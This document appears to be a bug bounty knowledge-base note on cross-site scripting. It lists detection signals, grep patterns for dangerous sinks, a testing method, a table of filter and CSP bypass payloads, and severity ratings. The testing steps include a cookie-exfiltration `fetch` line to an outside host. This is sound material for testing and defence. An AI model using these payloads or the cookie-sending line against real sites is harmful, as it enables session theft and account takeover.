---
fileClass: KB
type: pattern
tags: [pattern, xss, injection, client-side]
added: 2026-01-01
---

# Pattern — XSS (Cross-Site Scripting)

## Summary

Unsanitized user input is reflected or stored in a web page and executed as JavaScript in the victim's browser. Variants include reflected XSS (single request), stored XSS (persisted server-side), and DOM-based XSS (client-side sources and sinks with no server involvement).

## Detection Signals

- User input rendered in HTML response without encoding
- JavaScript sinks consuming URL parameters, hash fragments, or postMessage data
- Rich-text editors, comment fields, profile bios, or any persisted user content
- Server-side template rendering that interpolates user values into HTML
- React `dangerouslySetInnerHTML`, Vue `v-html`, or Angular `[innerHTML]` usage
- Content-Security-Policy header absent or permissive (`unsafe-inline`, `*`)

## Grep Signatures

```bash
# DOM sinks — innerHTML / outerHTML
grep -rn 'innerHTML\s*=\|outerHTML\s*=' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx'

# document.write and related sinks
grep -rn 'document\.write\|document\.writeln' --include='*.js' --include='*.ts'

# React dangerous prop
grep -rn 'dangerouslySetInnerHTML' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx'

# Vue v-html directive
grep -rn 'v-html' --include='*.vue' --include='*.js'

# eval and setTimeout/setInterval with string argument
grep -rn 'eval(\|setTimeout(\s*["\x27]\|setInterval(\s*["\x27]' --include='*.js' --include='*.ts'

# location-based source assignments
grep -rn 'location\.href\s*=\|location\.replace(\|location\.assign(' --include='*.js' --include='*.ts'

# Server-side template interpolation (Python/Jinja2/Django)
grep -rn '{{.*request\.\|{{.*params\.\|{{.*query\.' --include='*.html' --include='*.j2' --include='*.jinja'

# Server-side: unescaped Rails / ERB output
grep -rn '<%=.*params\[' --include='*.erb'
```

## Test Methodology

1. Identify input entry points: URL parameters, form fields, HTTP headers (User-Agent, Referer), JSON body fields, file upload names
2. Inject a canary string (`xssCANARY`) and search for it in the response to determine reflection context (HTML text, attribute, JavaScript string, URI)
3. Craft a context-appropriate payload (see bypass table) and test in a real browser; do not rely solely on response inspection
4. For stored XSS: submit payload, log out, log in as a different account, and navigate to where the content is rendered
5. For DOM XSS: trace sources (`location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`) to sinks using browser DevTools; add a breakpoint on the sink
6. Check for `Content-Security-Policy` header; if present, enumerate allowed origins and attempt CSP bypass (see table below)
7. Confirm execution with `alert(document.domain)` or `fetch('https://example.com/?c='+document.cookie)` — never exfiltrate real data beyond controlled collaborator endpoints

## Common Bypass Techniques

| Defense / Context | Bypass |
|-------------------|--------|
| HTML entity encoding (outside attributes) | Already inside a `<script>` block — no encoding needed |
| Attribute context with double-quote filter | Use single-quote: `' onmouseover='alert(1)` |
| JavaScript string context | Close string and inject: `'; alert(1)//` |
| URI context (`href`, `src`) | `javascript:alert(1)` or data URI |
| Tag/script keyword blocked | Alternate tag: `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>` |
| `<script>` tag filtered | Event handlers, `<iframe srcdoc=...>`, `<details open ontoggle=...>` |
| CSP with `nonce` | Nonce reuse, DOM clobbering, script gadget in allowed origin |
| CSP with `strict-dynamic` | Inject into an existing trusted script or use allowed CDN |
| CSP `unsafe-inline` blocked | Find JSONP endpoint in `script-src` allowlist |
| WAF keyword filtering | Case variation, HTML comments, URL encoding, Unicode normalization |
| `HttpOnly` cookies | Attack session token indirectly via CSRF-from-XSS or capture other non-HttpOnly tokens |

## Severity Guide

| Scenario | Severity |
|----------|----------|
| Stored XSS on authenticated page with access to sensitive data or session tokens | P2 |
| Stored XSS on public page (no auth required to trigger) | P2 |
| Reflected XSS on authenticated page | P3 |
| Reflected XSS on unauthenticated page | P3 |
| DOM XSS requiring user interaction (click, paste) | P3-P4 |
| Self-XSS (only triggers in attacker's own session, no delivery vector) | P5 |

## Related

- [[Pattern - IDOR]]
- [[Pattern - SSRF]]
- [[Lessons Learned]]
- [[Checklist - Pre-Submission Validation]]
- [[Playbook - Recon]]
